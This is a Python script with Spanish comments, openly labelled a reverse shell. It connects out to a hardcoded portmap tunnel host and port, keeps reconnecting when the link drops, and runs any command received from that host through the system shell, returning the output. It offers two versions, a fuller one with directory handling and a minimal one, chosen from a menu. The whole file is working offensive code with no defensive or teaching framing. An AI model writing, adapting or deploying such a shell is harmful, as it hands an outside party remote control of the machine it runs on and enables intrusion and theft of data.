#!/usr/bin/env python3
"""
REVERSE SHELL SIN ERRORES DE ASCII
"""

import socket
import subprocess
import os
import sys
import time

# ===== CONFIGURACIÓN =====
HOST = "Astrazam-37147.portmap.host"
PORT = 37147
# =========================

def clean_shell():
    """Shell limpia sin caracteres problemáticos"""
    print(f"[+] Conectando a {HOST}:{PORT}")
    
    while True:
        try:
            # Crear conexión
            s = socket.socket()
            s.settimeout(10)
            s.connect((HOST, PORT))
            s.settimeout(None)
            
            print("[+] Conectado - Shell activa")
            
            # Enviar mensaje inicial SIN ACENTOS
            s.sendall(b"\n[+] Shell lista - Escribe comandos:\n")
            s.sendall(b"$ ")
            
            # Directorio actual
            cwd = os.getcwd()
            
            # Bucle principal
            while True:
                try:
                    # Recibir comando
                    data = s.recv(4096).decode('utf-8', errors='ignore').strip()
                    
                    if not data:
                        break
                    
                    # Comandos especiales
                    if data.lower() in ["exit", "quit"]:
                        s.sendall(b"\n[!] Saliendo...\n")
                        s.close()
                        return
                    
                    # Manejar CD
                    if data.startswith("cd "):
                        path = data[3:].strip()
                        
                        # Corregir posibles errores
                        if path.startswith("--/"):
                            path = path.replace("--/", "~/")
                        if path.startswith("~/"):
                            home = os.path.expanduser("~")
                            path = path.replace("~", home, 1)
                        
                        try:
                            os.chdir(path)
                            cwd = os.getcwd()
                            s.sendall(f"[+] Directorio: {cwd}\n".encode())
                        except Exception as e:
                            s.sendall(f"[-] Error: {str(e)}\n".encode())
                        
                        s.sendall(b"$ ")
                        continue
                    
                    # Comando PWD
                    if data == "pwd":
                        s.sendall(f"{cwd}\n".encode())
                        s.sendall(b"$ ")
                        continue
                    
                    # Ejecutar cualquier otro comando
                    try:
                        proc = subprocess.run(
                            data,
                            shell=True,
                            cwd=cwd,
                            capture_output=True,
                            text=True,
                            timeout=30
                        )
                        
                        # Enviar output
                        if proc.stdout:
                            s.sendall(proc.stdout.encode())
                        if proc.stderr:
                            s.sendall(proc.stderr.encode())
                            
                    except subprocess.TimeoutExpired:
                        s.sendall(b"\n[!] Timeout: Comando muy largo\n")
                    except Exception as e:
                        s.sendall(f"[-] Error: {str(e)}\n".encode())
                    
                    # Nuevo prompt
                    s.sendall(b"\n$ ")
                    
                except socket.timeout:
                    # Mantener conexión viva
                    s.sendall(b"\n[ping] Conexion activa\n$ ")
                    continue
                except Exception as e:
                    break
            
            # Cerrar y reconectar
            s.close()
            print("[-] Reconectando...")
            time.sleep(3)
            
        except KeyboardInterrupt:
            print("\n[!] Interrumpido")
            sys.exit(0)
        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(5)

# ===== VERSIÓN EXTRA SEGURA =====
def ultra_safe_shell():
    """Versión ultra segura sin caracteres especiales"""
    print("[+] Shell ultra segura iniciada")
    
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            s.send(b"\n[+] Connected\n$ ")
            
            while True:
                try:
                    s.send(b"$ ")
                    cmd = s.recv(4096).decode().strip()
                    
                    if not cmd:
                        break
                    
                    # Comandos básicos
                    if cmd == "exit":
                        break
                    
                    # CD command
                    if cmd.startswith("cd "):
                        try:
                            os.chdir(cmd[3:])
                            s.send(b"[+] OK\n")
                        except:
                            s.send(b"[-] Error\n")
                        continue
                    
                    # Execute command
                    try:
                        result = subprocess.run(
                            cmd,
                            shell=True,
                            capture_output=True,
                            timeout=20
                        )
                        s.send(result.stdout)
                        s.send(result.stderr)
                    except:
                        s.send(b"[-] Command error\n")
                        
                except:
                    s.send(b"[ping]\n")
                    continue
                    
            s.close()
            time.sleep(3)
        except:
            time.sleep(5)
            continue

if __name__ == "__main__":
    # Menú simple
    print("\n" + "="*50)
    print("REVERSE SHELL - SIN ERRORES ASCII")
    print("="*50)
    print("1. Shell completa")
    print("2. Shell ultra simple")
    print("="*50)
    
    try:
        choice = input("Opcion: ").strip()
        
        if choice == "1":
            clean_shell()
        else:
            ultra_safe_shell()
            
    except KeyboardInterrupt:
        print("\n[+] Saliendo")
        sys.exit(0)
